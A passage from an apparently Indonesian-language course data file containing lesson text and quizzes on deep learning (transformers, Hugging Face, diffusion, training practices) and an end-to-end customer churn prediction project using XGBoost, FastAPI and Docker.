        attn = (q @ k.transpose(-2,-1)) * self.scale    # (B, H, T, T)
        if mask is not None:
            attn = attn.masked_fill(mask == 0, float('-inf'))
        attn = F.softmax(attn, dim=-1)
        out = (attn @ v).transpose(1,2).reshape(B, T, D)
        return self.to_out(out)

# Pakai nn.TransformerEncoderLayer untuk implementasi siap pakai
encoder_layer = nn.TransformerEncoderLayer(
    d_model=512, nhead=8, dim_feedforward=2048,
    dropout=0.1, batch_first=True, activation="gelu"
)
transformer = nn.TransformerEncoder(encoder_layer, num_layers=6)
\`\`\`

## Pre-trained Models & Hugging Face

\`\`\`python
from transformers import AutoTokenizer, AutoModelForSequenceClassification, pipeline

# Sentiment analysis dengan model pre-trained
classifier = pipeline("sentiment-analysis", model="distilbert-base-uncased-finetuned-sst-2-english")
results = classifier(["I love this!", "This is terrible."])

# Fine-tuning BERT
tokenizer = AutoTokenizer.from_pretrained("bert-base-uncased")
model = AutoModelForSequenceClassification.from_pretrained("bert-base-uncased", num_labels=5)

encodings = tokenizer(texts, padding=True, truncation=True, max_length=128, return_tensors="pt")
outputs = model(**encodings, labels=labels)
loss = outputs.loss
\`\`\`

## Image Generation (Diffusion)

\`\`\`python
from diffusers import StableDiffusionPipeline
import torch

pipe = StableDiffusionPipeline.from_pretrained(
    "runwayml/stable-diffusion-v1-5", torch_dtype=torch.float16
).to("cuda")

image = pipe("a futuristic city at sunset, cyberpunk style, highly detailed",
             num_inference_steps=30, guidance_scale=7.5).images[0]
image.save("city.png")
\`\`\`

## Framework Deep Learning

| Framework | Developer | Karakteristik |
|-----------|-----------|---------------|
| **PyTorch** | Meta | Dynamic graph, Pythonic, riset dominan |
| **TensorFlow / Keras** | Google | Production, TFLite untuk mobile |
| **JAX** | Google | Functional, autodiff, XLA, riset modern |
| **MXNet** | Apache | AWS, semakin kurang populer |

PyTorch mendominasi riset; TensorFlow/Keras kuat di production & mobile. JAX naik daun untuk model besar.

## Training Best Practices

\`\`\`python
# Mixed precision training (fp16) - 2x lebih cepat
from torch.cuda.amp import autocast, GradScaler
scaler = GradScaler()

for xb, yb in loader:
    optimizer.zero_grad()
    with autocast():
        out = model(xb)
        loss = criterion(out, yb)
    scaler.scale(loss).backward()
    scaler.step(optimizer)
    scaler.update()

# Distributed training
import torch.distributed as dist
dist.init_process_group("nccl")
model = nn.parallel.DistributedDataParallel(model, device_ids=[local_rank])

# Gradient clipping (anti exploding gradient)
torch.nn.utils.clip_grad_norm_(model.parameters(), max_norm=1.0)
\`\`\`

## Tips & Best Practices

- **Transfer learning** — mulai dari model pre-trained (ImageNet, HuggingFace) untuk dataset kecil.
- **Data augmentation** — flip, rotasi, crop, color jitter untuk image; synonym swap untuk text.
- **Learning rate warmup** — mulai lr kecil, naikkan, lalu decay (cosine).
- **Batch size besar** = gradien lebih halus, tetapi butuh lr besar + warmup.
- **Label smoothing** — anti over-confidence, meningkatkan kalibrasi.
- **Mixed precision + gradient accumulation** untuk training model besar pada GPU terbatas.
- **Monitor**: loss, gradient norm, weight norm, learning rate, val metric.

## MLOps untuk Deep Learning

- **Experiment tracking** — MLflow, W&B, TensorBoard.
- **Versioning data + model** — DVC, HuggingFace Hub.
- **Serving** — TorchServe, Triton, ONNX Runtime, vLLM untuk LLM.
- **Monitoring** — data drift, concept drift, performance, latency.
- **Quantization & pruning** — kompres model untuk edge/mobile.

## Kesimpulan

Deep learning adalah mesin di balik revolusi AI modern. CNN untuk vision, RNN/LSTM untuk sequence klasik, dan Transformer untuk hampir semua tugas modern. Memahami blok bangunan (conv, attention, batchnorm, transfer learning) lebih penting daripada menghafal setiap arsitektur. Yang membedakan praktisi hebat adalah **kemampuan eksperimen terkontrol**: hipotesis → tracking → diagnosis → iterasi. Pada level berikutnya kita akan menerapkan semuanya dalam project end-to-end.`,
    quiz: [
      {
        question: "Arsitektur deep learning yang khusus untuk data gambar?",
        options: ["RNN", "CNN", "Transformer", "MLP"],
        answer: 1,
        explanation: "CNN menggunakan convolution untuk belajar pola lokal hierarkis pada gambar."
      },
      {
        question: "Mekanisme inti yang membuat Transformer paralel dan scaling baik?",
        options: ["Recurrence", "Self-attention", "Pooling", "Dropout"],
        answer: 1,
        explanation: "Self-attention memproses seluruh sequence paralel, tidak perlu rekurens."
      },
      {
        question: "Strategi hemat waktu training untuk dataset kecil?",
        options: ["Train dari nol", "Transfer learning dari pre-trained", "Hapus regularization", "Naikkan learning rate drastis"],
        answer: 1,
        explanation: "Transfer learning memanfaatkan fitur pre-trained; efektif untuk data terbatas."
      }
    ]
  },
  {
    level: 8,
    order: 8,
    title: "Project: ML Model",
    slug: "project-ml-model",
    description: "Project end-to-end: bangun, training, deploy, dan monitor model ML.",
    icon: "🎯",
    isProject: true,
    content: `# Project: ML Model End-to-End

Selamat! Anda telah sampai di project akhir. Di sini kita merangkai semua yang telah dipelajari—Python, preprocessing, supervised/unsupervised, neural network—menjadi satu pipeline ML end-to-end yang siap produksi. Project ini membangun **model prediksi churn pelanggan** dengan workflow yang dapat direplikasi: dari data hingga deployment dan monitoring.

![Project ML Model](https://sfile.chatglm.cn/images-ppt/2ccd2dc8282b.png)

## Skema Project

\`\`\`text
┌──────────────┐   ┌──────────────┐   ┌──────────────┐
│  Raw Data    │ → │ Preprocess   │ → │ Feature Eng  │
│  (CSV/DB)    │   │ (clean,fill) │   │ (date,enc)   │
└──────────────┘   └──────────────┘   └──────┬───────┘
                                              ↓
┌──────────────┐   ┌──────────────┐   ┌──────────────┐
│  Monitoring  │ ← │ Deploy API   │ ← │ Train + Eval │
│  (drift,met) │   │  (FastAPI)   │   │  (XGBoost)   │
└──────────────┘   └──────────────┘   └──────────────┘
\`\`\`

## Struktur Folder

\`\`\`text
churn-project/
├── data/
│   ├── raw/                  # immutable raw
│   ├── interim/              # intermediate
│   └── processed/            # train/val/test splits
├── notebooks/                # EDA & eksperimen
├── src/
│   ├── data.py               # load & split
│   ├── features.py           # preprocessing pipeline
│   ├── train.py              # training
│   ├── evaluate.py           # metrics + reports
│   ├── serve.py              # FastAPI app
│   └── config.py             # konfigurasi
├── tests/
├── models/                   # serialized artifacts
├── deployment/
│   ├── Dockerfile
│   └── docker-compose.yml
├── requirements.txt
├── Makefile
└── README.md
\`\`\`

## Step 1: Eksplorasi & Data Loading

\`\`\`python
# src/data.py
import pandas as pd
from sklearn.model_selection import train_test_split
from pathlib import Path

def load_data(path="data/raw/churn.csv"):
    df = pd.read_csv(path)
    df["signup_date"] = pd.to_datetime(df["signup_date"])
    df["last_activity"] = pd.to_datetime(df["last_activity"])
    return df

def split_data(df, test_size=0.2, val_size=0.2, random_state=42):
    train, test = train_test_split(df, test_size=test_size,
                                   stratify=df["churn"], random_state=random_state)
    train, val = train_test_split(train, test_size=val_size/(1-test_size),
                                  stratify=train["churn"], random_state=random_state)
    return train, val, test

if __name__ == "__main__":
    df = load_data()
    train, val, test = split_data(df)
    print(f"Train: {len(train)}, Val: {len(val)}, Test: {len(test)}")
    print(f"Churn rate train: {train['churn'].mean():.3f}")
    train.to_parquet("data/processed/train.parquet")
    val.to_parquet("data/processed/val.parquet")
    test.to_parquet("data/processed/test.parquet")
\`\`\`

## Step 2: Feature Engineering Pipeline

\`\`\`python
# src/features.py
from sklearn.compose import ColumnTransformer
from sklearn.pipeline import Pipeline
from sklearn.preprocessing import StandardScaler, OneHotEncoder
from sklearn.impute import SimpleImputer
import pandas as pd
import numpy as np

NUMERIC = ["age", "monthly_spend", "tenure_months", "sessions_last_30d"]
CATEGORICAL = ["plan_type", "country", "payment_method"]

def build_preprocessor():
    num_pipe = Pipeline([
        ("imputer", SimpleImputer(strategy="median")),
        ("scaler", StandardScaler()),
    ])
    cat_pipe = Pipeline([
        ("imputer", SimpleImputer(strategy="most_frequent")),
        ("onehot", OneHotEncoder(handle_unknown="ignore", sparse_output=False)),
    ])
    return ColumnTransformer([
        ("num", num_pipe, NUMERIC),
        ("cat", cat_pipe, CATEGORICAL),
    ])

def add_engineered_features(df):
    df = df.copy()
    df["days_since_activity"] = (pd.Timestamp.today() - df["last_activity"]).dt.days
    df["spend_per_session"] = df["monthly_spend"] / (df["sessions_last_30d"] + 1)
    df["is_high_value"] = (df["monthly_spend"] > df["monthly_spend"].quantile(0.75)).astype(int)
    return df
\`\`\`

## Step 3: Training dengan XGBoost

\`\`\`python
# src/train.py
import xgboost as xgb
from sklearn.metrics import f1_score, roc_auc_score, classification_report
import joblib, json
from data import load_data, split_data
from features import build_preprocessor, add_engineered_features

def train():
    df = load_data()
    df = add_engineered_features(df)
    train, val, _ = split_data(df)

    feature_cols = ["age", "monthly_spend", "tenure_months", "sessions_last_30d",
                    "plan_type", "country", "payment_method",
                    "days_since_activity", "spend_per_session", "is_high_value"]
    X_train, y_train = train[feature_cols], train["churn"]
    X_val, y_val = val[feature_cols], val["churn"]

    preprocessor = build_preprocessor()
    X_train_p = preprocessor.fit_transform(X_train)
    X_val_p = preprocessor.transform(X_val)

    model = xgb.XGBClassifier(
        n_estimators=500, max_depth=6, learning_rate=0.05,
        subsample=0.8, colsample_bytree=0.8,
        scale_pos_weight=(len(y_train) - y_train.sum()) / y_train.sum(),
        eval_metric="auc", early_stopping_rounds=20, random_state=42
    )
    model.fit(X_train_p, y_train, eval_set=[(X_val_p, y_val)], verbose=False)

    y_pred = model.predict(X_val_p)
    y_prob = model.predict_proba(X_val_p)[:, 1]
    metrics = {
        "f1": float(f1_score(y_val, y_pred)),
        "auc": float(roc_auc_score(y_val, y_prob)),
    }
    print(classification_report(y_val, y_pred))
    print(f"Val AUC: {metrics['auc']:.4f}, F1: {metrics['f1']:.4f}")

    joblib.dump({"preprocessor": preprocessor, "model": model,
                 "features": feature_cols}, "models/churn_model.joblib")
    with open("models/metrics.json", "w") as f:
        json.dump(metrics, f, indent=2)

if __name__ == "__main__":
    train()
\`\`\`

## Step 4: API Deployment dengan FastAPI

\`\`\`python
# src/serve.py
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel, Field
import pandas as pd, joblib

app = FastAPI(title="Churn Prediction API", version="1.0.0")
artifact = joblib.load("models/churn_model.joblib")
preprocessor = artifact["preprocessor"]
model = artifact["model"]
features = artifact["features"]

class CustomerData(BaseModel):
    age: int = Field(..., ge=0, le=150)
    monthly_spend: float = Field(..., ge=0)
    tenure_months: int = Field(..., ge=0)
    sessions_last_30d: int = Field(..., ge=0)
    plan_type: str
    country: str
    payment_method: str
    days_since_activity: int = Field(..., ge=0)
    spend_per_session: float = Field(..., ge=0)
    is_high_value: int = Field(..., ge=0, le=1)

@app.get("/health")
def health(): return {"status": "ok"}

@app.post("/predict")
def predict(c: CustomerData):
    try:
        df = pd.DataFrame([c.dict()])
        X = preprocessor.transform(df[features])
        prob = float(model.predict_proba(X)[0, 1])
        pred = int(prob > 0.5)
        return {"churn_probability": prob, "prediction": pred,
                "risk_level": "high" if prob > 0.7 else "medium" if prob > 0.3 else "low"}
    except Exception as e:
        raise HTTPException(400, str(e))
\`\`\`

\`\`\`bash
# Run API
uvicorn src.serve:app --host 0.0.0.0 --port 8000 --reload

# Test
curl -X POST http://localhost:8000/predict \\
  -H "Content-Type: application/json" \\
  -d '{"age":32,"monthly_spend":85.5,"tenure_months":14,"sessions_last_30d":22,
       "plan_type":"pro","country":"ID","payment_method":"credit_card",
       "days_since_activity":3,"spend_per_session":3.7,"is_high_value":0}'
\`\`\`

## Step 5: Dockerize

\`\`\`dockerfile
# deployment/Dockerfile
FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY src/ ./src/
COPY models/ ./models/
EXPOSE 8000
CMD ["uvicorn", "src.serve:app", "--host", "0.0.0.0", "--port", "8000"]
\`\`\`

\`\`\`yaml
# deployment/docker-compose.yml
version: "3.9"
services:
  api:
    build: ..
    ports: ["8000:8000"]
    environment:
      MODEL_PATH: /app/models/churn_model.joblib
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:8000/health"]
      interval: 30s
      retries: 3
    restart: unless-stopped
    deploy:
      resources:
        limits: {cpus: "1.0", memory: 512M}
\`\`\`

\`\`\`bash
docker compose -f deployment/docker-compose.yml up -d --build
\`\`\`

## Step 6: Monitoring & MLOps

\`\`\`python
# Tambahkan ke serve.py: log prediksi untuk monitoring
import structlog, time
log = structlog.get_logger()

@app.middleware("http")
async def log_requests(request, call_next):
    start = time.time()
    response = await call_next(request)
    duration = time.time() - start
    log.info("prediction",
             path=request.url.path,
             status=response.status_code,
             duration_ms=round(duration*1000, 2))
    return response

# Monitor distribusi prediksi (data drift)
from collections import deque
recent_probs = deque(maxlen=1000)

@app.post("/predict")
def predict(c: CustomerData):
    # ... existing logic ...
    recent_probs.append(prob)
    if len(recent_probs) >= 100:
        import numpy as np
        arr = np.array(recent_probs)
        log.info("drift_check",
                 mean=float(arr.mean()),
                 p95=float(np.quantile(arr, 0.95)),
                 n=len(arr))
    return {...}
\`\`\`

\`\`\`text
Checklist MLOps:
□ Model versioning (MLflow registry / joblib + git tag)
□ Data versioning (DVC)
□ Experiment tracking (MLflow / W&B)
□ CI/CD pipeline (GitHub Actions: test + build + deploy)
□ API monitoring (Prometheus + Grafana)
□ Data drift detection (Evidently / Alibi Detect)
□ Alerting (Slack/PagerDuty) bila AUC < threshold
□ Retraining schedule (weekly/monthly or trigger-based)
□ Shadow deployment untuk model baru
□ A/B test sebelum full rollout
\`\`\`

## Step 7: Makefile untuk Reproducibility

\`\`\`makefile
# Makefile
.PHONY: install data train evaluate serve test docker-build docker-up

install:
\tpip install -r requirements.txt

data:
\tpython -m src.data

train:
\tpython -m src.train

evaluate:
\tpython -m src.evaluate

serve:
\tuvicorn src.serve:app --reload --port 8000

test:
\tpytest tests/ -v --cov=src

docker-build:
\tdocker compose -f deployment/docker-compose.yml build

docker-up:
\tdocker compose -f deployment/docker-compose.yml up -d
\`\`\`

## Tips & Best Practices

- **Reproducibility**: pin semua versi di requirements.txt, set random seed.
- **Test-driven**: unit test untuk preprocessing & prediksi (\`pytest\`).
- **Document model** dengan **model card** (asumsi, limitasi, etika).
- **Shadow mode** untuk model baru—log prediksi tanpa impact pengguna.
- **Canary rollout**: 5% → 25% → 100% dengan metric monitoring.
- **Champion/challenger**: bandingkan model baru vs produksi.
- **Plan for failure**: rollback otomatis bila metric drop.

## Kesimpulan

Project ini merangkum siklus ML end-to-end: data → preprocessing → training → evaluation → deployment → monitoring. Yang membedakan project "berjalan di laptop" dari "berjalan di produksi" adalah **reproducibility, testing, monitoring, dan plan for failure**. Dengan workflow ini, Anda siap menghadapi tantangan ML di industri: data berubah, model degradasi, stakeholder minta penjelasan. Selamat! Anda telah menyelesaikan perjalanan dari IT dasar hingga machine learning produksi. Teruslah bereksperimen—ML adalah bidang yang berubah cepat dan pembelajaran tidak pernah berhenti.`,
    quiz: [
      {
        question: "Urutan yang benar dalam workflow ML end-to-end?",
        options: ["Deploy → Train → Data → Eval", "Data → Train → Eval → Deploy → Monitor", "Train → Data → Deploy → Eval", "Eval → Deploy → Data → Train"],
        answer: 1,
        explanation: "Workflow: data collection → training → evaluation → deployment → monitoring."
      },
      {
        question: "Framework yang direkomendasikan untuk serving model sebagai API?",
        options: ["Matplotlib", "FastAPI", "pandas", "NumPy"],
        answer: 1,
        explanation: "FastAPI ringan, async, auto-generate docs—ideal untuk model serving."
      },
      {
        question: "Hal krusial untuk mendeteksi degradasi model di produksi?",
        options: ["Disable logging", "Monitoring data drift + concept drift", "Pakai latest tag", "Retrain harian tanpa evaluasi"],
        answer: 1,
        explanation: "Data/concept drift mendeteksi perubahan distribusi yang menyebabkan akurasi turun."
      }
    ]
  }
];
